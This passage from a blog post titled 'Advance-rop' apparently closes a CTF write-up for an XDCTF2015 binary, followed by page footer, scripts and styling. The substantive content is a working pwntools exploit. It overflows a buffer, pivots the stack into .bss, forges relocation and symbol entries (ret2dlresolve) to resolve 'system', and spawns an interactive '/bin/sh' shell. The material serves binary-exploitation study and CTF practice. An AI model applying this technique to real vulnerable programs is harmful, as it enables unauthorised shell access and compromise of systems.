ppp_ret=0x08048619
bss_start=elf.bss()
offset=108
stack_base=bss_start+0x800
ebp=stack_base 
leave_ret=0x08048458
pop_ebp_ret=0x0804861b
plt0=0x08048380
rel_plt=0x08048330

fake_sym=stack_base+0x80
rel_index=stack_base+0x60-rel_plt
dyn_sym=0x80481D8
dyn_str=0x08048278
sym_index=(stack_base+0x88-dyn_sym)/0x10
r_info=(sym_index&lt;&lt;8)+7
log.success(&#39;r_info:%x&#39;%r_info)

fake_reloc=flat([write_got,r_info]) # at stack_base+0x60
st_name_offset=stack_base+0xa0-dyn_str
fake_sym=flat([st_name_offset,0,0,12]) # at stack_base+0x80

log.success(&#39;stack_base:%x&#39;%stack_base)
log.success(&#39;dyn_sym:%x&#39;%dyn_sym)

# migrate stack 
p.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)
payload=&#39;a&#39;*offset+flat([
    ebp,read_plt,ppp_ret,0,stack_base,0x200,pop_ebp_ret,stack_base,leave_ret]
    )
p.sendline(payload)
sleep(0.1)
#gdb.attach(p,&#39;b *main\n&#39;)
cmd=&#39;/bin/sh;\x00&#39;

payload2=flat([
    &#39;a&#39;*4,
    plt0,
    rel_index,
    0xdeadbeef, #any_ret
    stack_base+0x40, # cmd string is here
])

payload2+=&#39;b&#39;*(0x40-len(payload2))
payload2 += cmd
payload2 += &#39;b&#39;*(0x60-len(payload2))
payload2+=fake_reloc
payload2+=&#39;b&#39;*(0x88-len(payload2)) 
payload2+=fake_sym #stack_base+0x80
payload2+=&#39;b&#39;*(0xa0-len(payload2))
payload2+=&#39;system\x00&#39;


p.sendline(payload2)
p.interactive()</code></pre>

      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚å¯ä»¥åœ¨ä¸‹é¢è¯„è®ºåŒºè¯„è®ºã€‚ </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">æ–‡ç« æ ‡é¢˜:</span>Advance-rop</p>
    
    <p><span class="copy-title">æœ¬æ–‡ä½œè€…:</span><a  title="æ«äº‘æ">æ«äº‘æ</a></p>
    <p><span class="copy-title">å‘å¸ƒæ—¶é—´:</span>2019-11-07, 09:50:48</p>
    <p><span class="copy-title">æœ€åæ›´æ–°:</span>2020-03-28, 19:14:17</p>
    <span class="copy-title">åŸå§‹é“¾æ¥:</span><a class="post-url" href="/2019/11/07/Advance-rop/" title="Advance-rop">https://primelyw.github.io/2019/11/07/Advance-rop/</a>
    <p>
        <span class="copy-title">ç‰ˆæƒå£°æ˜:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"ç½²å-éå•†ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0"</a> è½¬è½½è¯·ä¿ç•™åŸæ–‡é“¾æ¥åŠä½œè€…ã€‚
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">Â©2020 æ«äº‘æ</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">ç›®å½•</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*ä½œè€…ã€æ ‡ç­¾çš„è‡ªåŠ¨è¡¥å…¨*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#Pwn','#CTF','#CVE','#Defcon','#fuzz','#afl',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("/img/article-list-bg.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
    .post .pjax article :not(pre) > code {
        color: #24292e;
        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
        background-color: rgba(27,31,35,.05);
        border-radius: 3px;
        font-size: 85%;
        margin: 0;
        padding: .2em .4em;
    }
    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
</div>


</html>
